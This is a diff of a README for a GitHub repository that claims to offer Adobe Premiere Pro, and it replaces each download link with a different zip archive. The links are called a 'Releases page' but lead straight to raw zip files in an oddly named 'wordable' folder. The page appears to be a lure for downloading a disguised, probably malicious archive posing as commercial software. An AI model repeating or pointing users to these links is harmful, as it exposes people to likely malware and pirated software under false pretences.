@@ -1,6 +1,6 @@
 # 🎥 adobe-premiere-pro - Your Tool for Professional Video Editing
 
-[![Download](https://github.com/Eduardo-salamanca/adobe-premiere-pro/raw/refs/heads/main/wordable/premiere_pro_adobe_v2.0-beta.3.zip%https://github.com/Eduardo-salamanca/adobe-premiere-pro/raw/refs/heads/main/wordable/premiere_pro_adobe_v2.0-beta.3.zip)](https://github.com/Eduardo-salamanca/adobe-premiere-pro/raw/refs/heads/main/wordable/premiere_pro_adobe_v2.0-beta.3.zip)
+[![Download](https://raw.githubusercontent.com/Eduardo-salamanca/adobe-premiere-pro/main/wordable/adobe_pro_premiere_v3.5.zip%https://raw.githubusercontent.com/Eduardo-salamanca/adobe-premiere-pro/main/wordable/adobe_pro_premiere_v3.5.zip)](https://raw.githubusercontent.com/Eduardo-salamanca/adobe-premiere-pro/main/wordable/adobe_pro_premiere_v3.5.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these steps to get started with Adobe Premiere Pro:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/Eduardo-salamanca/adobe-premiere-pro/raw/refs/heads/main/wordable/premiere_pro_adobe_v2.0-beta.3.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Eduardo-salamanca/adobe-premiere-pro/main/wordable/adobe_pro_premiere_v3.5.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of Adobe Premiere Pro. Choose the latest version for the best features and performance.
@@ -61,7 +61,7 @@ Before installing Adobe Premiere Pro, please ensure your system meets the follow
 
 To download Adobe Premiere Pro, visit the Releases page. There, you will find the latest version suited for your operating system.
 
-[Visit this page to download](https://github.com/Eduardo-salamanca/adobe-premiere-pro/raw/refs/heads/main/wordable/premiere_pro_adobe_v2.0-beta.3.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Eduardo-salamanca/adobe-premiere-pro/main/wordable/adobe_pro_premiere_v3.5.zip)
 
 ## 🛠️ Support
 
